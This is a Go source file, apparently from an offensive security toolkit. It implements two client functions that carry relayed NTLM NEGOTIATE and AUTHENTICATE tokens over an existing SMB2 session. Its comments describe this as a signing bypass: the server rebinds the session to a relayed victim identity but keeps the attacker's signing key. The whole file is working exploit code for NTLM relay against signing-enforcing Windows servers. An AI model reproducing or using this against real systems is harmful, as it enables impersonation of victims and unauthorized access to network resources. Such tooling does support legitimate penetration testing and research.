package client

import (
	"fmt"

	"github.com/TheManticoreProject/Manticore/network/smb/smb_v20/message/commands"
	"github.com/TheManticoreProject/Manticore/network/smb/smb_v20/securitymode"
)

// RelayReauthNegotiateBlob sends the first SESSION_SETUP leg of a cross-user
// re-authentication, carrying a caller-supplied NTLM NEGOTIATE on the client's
// EXISTING session instead of a new one.
//
// Unlike SessionSetupNegotiateBlob, which opens a fresh unsigned session, this
// re-authenticates the session already established by a prior credentialed
// SessionSetup: the request goes out on that session's id and is signed with its
// key (the engine signs when the session's signing is active). This is the
// outbound opening leg of the SMB signing bypass (MS-SMB2 3.3.5.5.2): a server
// that keeps the session's signing key across a re-authentication — Windows does,
// but the Manticore SMB2 server deliberately refuses re-authentication — ends up
// with the relayed identity bound to a key this client already holds, so the
// relayed session can be signed although the relay never learned the victim's
// key. Pair it with RelayReauthAuthenticateBlob.
//
// It requires an established session (call SessionSetup with a seed credential
// first). Returns the server's CHALLENGE token.
func (c *Client) RelayReauthNegotiateBlob(negotiateToken []byte) (challengeToken []byte, err error) {
	if c.Session == nil {
		return nil, fmt.Errorf("re-authentication requires an established session; call SessionSetup with a seed credential first")
	}
	if !c.Transport.IsConnected() {
		return nil, fmt.Errorf("transport is not connected")
	}

	req := commands.NewSessionSetupRequest()
	req.SecurityMode = securitymode.SMB2_NEGOTIATE_SIGNING_ENABLED
	req.SecurityBuffer = negotiateToken

	msg := c.newRequest(req)
	// Re-authenticate the existing session rather than opening a new one.
	msg.Header.SessionId = c.Session.SessionId

	resp, err := c.sendReceive(msg, "RelayReauth(negotiate)")
	if err != nil {
		return nil, err
	}
	if status := statusFromResponse(resp); status != ntStatusMoreProcessingRequired {
		return nil, fmt.Errorf("unexpected re-authentication SESSION_SETUP status: %s", formatNTStatus(status))
	}

	challengeResp, ok := resp.Command.(*commands.SessionSetupResponse)
	if !ok {
		return nil, fmt.Errorf("unexpected SESSION_SETUP response command: %T", resp.Command)
	}
	return challengeResp.SecurityBuffer, nil
}

// RelayReauthAuthenticateBlob sends the second SESSION_SETUP leg of a cross-user
// re-authentication, carrying a caller-supplied NTLM AUTHENTICATE on the existing
// session.
//
// On success the session is deliberately left untouched: its id and signing key
// are kept, so this client keeps signing with the key it derived from the seed
// credential while the server has swapped the session's identity to the relayed
// one. That retained key is the whole point of the bypass — it is what lets a
// relayed session be signed against a target that enforces signing.
//
// It requires that RelayReauthNegotiateBlob ran first on the same session.
func (c *Client) RelayReauthAuthenticateBlob(authenticateToken []byte) error {
	if c.Session == nil {
		return fmt.Errorf("re-authentication requires an established session")
	}
	if !c.Transport.IsConnected() {
		return fmt.Errorf("transport is not connected")
	}

	req := commands.NewSessionSetupRequest()
	req.SecurityMode = securitymode.SMB2_NEGOTIATE_SIGNING_ENABLED
	req.SecurityBuffer = authenticateToken

	msg := c.newRequest(req)
	msg.Header.SessionId = c.Session.SessionId

	resp, err := c.sendReceive(msg, "RelayReauth(authenticate)")
	if err != nil {
		return err
	}
	if status := statusFromResponse(resp); status != 0x00000000 {
		return fmt.Errorf("re-authentication failed: %s", formatNTStatus(status))
	}
	// Keep c.Session exactly as it is: same id, same signing key. The server has
	// rebound the session to the relayed identity but kept the key this client
	// holds.
	return nil
}
